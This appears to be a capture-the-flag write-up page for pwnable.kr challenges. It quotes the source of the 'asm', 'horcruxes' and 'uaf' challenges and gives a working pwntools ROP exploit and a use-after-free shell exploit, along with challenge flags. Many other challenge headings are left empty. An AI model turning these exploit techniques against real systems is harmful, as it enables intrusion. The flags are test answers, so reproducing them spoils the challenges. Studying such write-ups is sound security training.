> Mommy! I think I know how to make shellcodes
> 
> ssh asm@pwnable.kr -p2222 (pw: guest)

asm.c:
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <seccomp.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <unistd.h>

#define LENGTH 128

void sandbox(){
	scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
	if (ctx == NULL) {
		printf("seccomp error\n");
		exit(0);
	}

	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

	if (seccomp_load(ctx) < 0){
		seccomp_release(ctx);
		printf("seccomp error\n");
		exit(0);
	}
	seccomp_release(ctx);
}

char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
unsigned char filter[256];
int main(int argc, char* argv[]){

	setvbuf(stdout, 0, _IONBF, 0);
	setvbuf(stdin, 0, _IOLBF, 0);

	printf("Welcome to shellcoding practice challenge.\n");
	printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");
	printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");
	printf("If this does not challenge you. you should play 'asg' challenge :)\n");

	char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
	memset(sh, 0x90, 0x1000);
	memcpy(sh, stub, strlen(stub));
	
	int offset = sizeof(stub);
	printf("give me your x64 shellcode: ");
	read(0, sh+offset, 1000);

	alarm(10);
	chroot("/home/asm_pwn");	// you are in chroot jail. so you can't use symlink in /tmp
	sandbox();
	((void (*)(void))sh)();
	return 0;
}
```

## [](#header-2)horcruxes

> Voldemort concealed his splitted soul inside 7 horcruxes.
> 
> Find all horcruxes, and ROP it!
> 
> author: jiwon choi
> 
> connect to port 9032 (nc 0 9032). the 'horcruxes' binary will be executed under horcruxes_pwn privilege.
> 
> rop it to read the flag.

```c
int ropme()
{
  char s[100]; // [esp+4h] [ebp-74h] BYREF
  int input_char; // [esp+68h] [ebp-10h] BYREF
  int fd; // [esp+6Ch] [ebp-Ch]

  printf("Select Menu:");
  __isoc99_scanf("%d", &input_char);
  getchar();
  if ( input_char == a )
  {
    A();
  }
  else if ( input_char == b )
  {
    B();
  }
  else if ( input_char == c )
  {
    C();
  }
  else if ( input_char == d )
  {
    D();
  }
  else if ( input_char == e )
  {
    E();
  }
  else if ( input_char == f )
  {
    F();
  }
  else if ( input_char == g )
  {
    G();
  }
  else
  {
    printf("How many EXP did you earned? : ");
    gets(s);
    if ( atoi(s) == sum )
    {
      fd = open("/home/horcruxes_pwn/flag", 0);
      s[read(fd, s, 0x64u)] = 0;
      puts(s);
      close(fd);
      exit(0);
    }
    puts("You'd better get more experience to kill Voldemort");
  }
  return 0;
}

...

int A()
{
  return printf("You found \"Tom Riddle's Diary\" (EXP +%d)\n", a);
}

...
```

```python
from pwn import *

payload  = b"A" * 0x78
payload += p32(0x0804129D) # address A()
payload += p32(0x080412CF) # address B()
payload += p32(0x08041301) # address C()
payload += p32(0x08041333) # address D()
payload += p32(0x08041365) # address E()
payload += p32(0x08041397) # address F()
payload += p32(0x080413C9) # address G()
payload += p32(0x0804150B) # address ropme()

#with open("/tmp/pay1/payload", "wb") as f:
#    f.write(b"123\n")
#    f.write(payload)

con = remote("0", 9032)

print(con.recvuntil("Select Menu:".encode("UTF-8")))

con.sendline("123".encode("UTF-8"))

print(con.recvuntil("How many EXP did you earned? : ".encode("UTF-8")))

con.sendline(payload)
print(con.recvline())

sum = 0
for i in range(7):
  sum += int(con.recvline().decode("utf-8").split("+")[1][:-2])

con.sendline("123".encode("UTF-8"))
con.sendline(str(sum).encode("UTF-8"))
print(con.recvline())
con.interactive()
```

```bash
horcruxes@ubuntu:~$ python3 /tmp/sploit.py
[+] Opening connection to 0 on port 9032: Done
b'Voldemort concealed his splitted soul inside 7 horcruxes.\nFind all horcruxes, and destroy it!\n\nSelect Menu:'
b'How many EXP did you earned? : '
b"You'd better get more experience to kill Voldemort\n"
b'Select Menu:How many EXP did you earned? : The_M4gic_sp3l1_is_Avada_Ked4vra\n'
[*] Switching to interactive mode

[*] Got EOF while reading in interactive
$
```

# [](#header-1)[Rookiss]
## [](#header-2)brain fuck
## [](#header-2)md5 calculator
## [](#header-2)simple login
## [](#header-2)otp
## [](#header-2)ascii_easy
## [](#header-2)tiny_easy
## [](#header-2)dragon
## [](#header-2)syscall
## [](#header-2)crypto1
## [](#header-2)echo2
## [](#header-2)rsa calculator
## [](#header-2)uaf

> Mommy, what is Use After Free bug?
> 
> ssh uaf@pwnable.kr -p2222 (pw:guest)

```c
#include <fcntl.h>
#include <iostream> 
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
        virtual void give_shell(){
                system("/bin/sh");
        }
protected:
        int age;
        string name;
public:
        virtual void introduce(){
                cout < "My name is " < name < endl;
                cout < "I am " < age < " years old" < endl;
        }
};

class Man: public Human{
public:
        Man(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout < "I am a nice guy!" < endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout < "I am a cute girl!" < endl;
        }
};

int main(int argc, char* argv[]){
        Human* m = new Man("Jack", 25);
        Human* w = new Woman("Jill", 21);

        size_t len;
        char* data;
        unsigned int op;
        while(1){
                cout < "1. use\n2. after\n3. free\n";
                cin > op;

                switch(op){
                        case 1:
                                m->introduce();
                                w->introduce();
                                break;
                        case 2:
                                len = atoi(argv[1]);
                                data = new char[len];
                                read(open(argv[2], O_RDONLY), data, len);
                                cout < "your data is allocated" < endl;
                                break;
                        case 3:
                                delete m;
                                delete w;
                                break;
                        default:
                                break;
                }
        }

        return 0;
}
```

```bash 
python -c 'print ("\x68\x15\x40\x00\x00\x00\x00\x00")' > /tmp/ihcuaf

./uaf 24 /tmp/ihcuaf

3 2 2 1

cat flag
```

`yay_f1ag_aft3r_pwning`

https://gist.github.com/ihciah/3c157f18f49bd2287470

https://medium.com/@c0ngwang/pwnable-kr-writeup-uaf-4cb8ba851472

## [](#header-2)unlink
## [](#header-2)loveletter
## [](#header-2)chatbot
## [](#header-2)crashgen
## [](#header-2)leakme

# [](#header-1)[Grotesque]
## [](#header-2)rootkit
## [](#header-2)ascii
## [](#header-2)aeg
## [](#header-2)coin2
## [](#header-2)maze
## [](#header-2)wtf
## [](#header-2)note
## [](#header-2)starcraft
## [](#header-2)cmd3
## [](#header-2)elf
## [](#header-2)lfh
## [](#header-2)asg
## [](#header-2)hunter
## [](#header-2)mipstake
## [](#header-2)asm3
## [](#header-2)sizcaller

# [](#header-1)[Hacker's Secret]
## [](#header-2)softmmu
## [](#header-2)dos4fun
## [](#header-2)towelroot
## [](#header-2)nuclear
## [](#header-2)malware
## [](#header-2)tiny_hard
## [](#header-2)kcrc
## [](#header-2)exynos
## [](#header-2)pwnsandbox
## [](#header-2)asm2

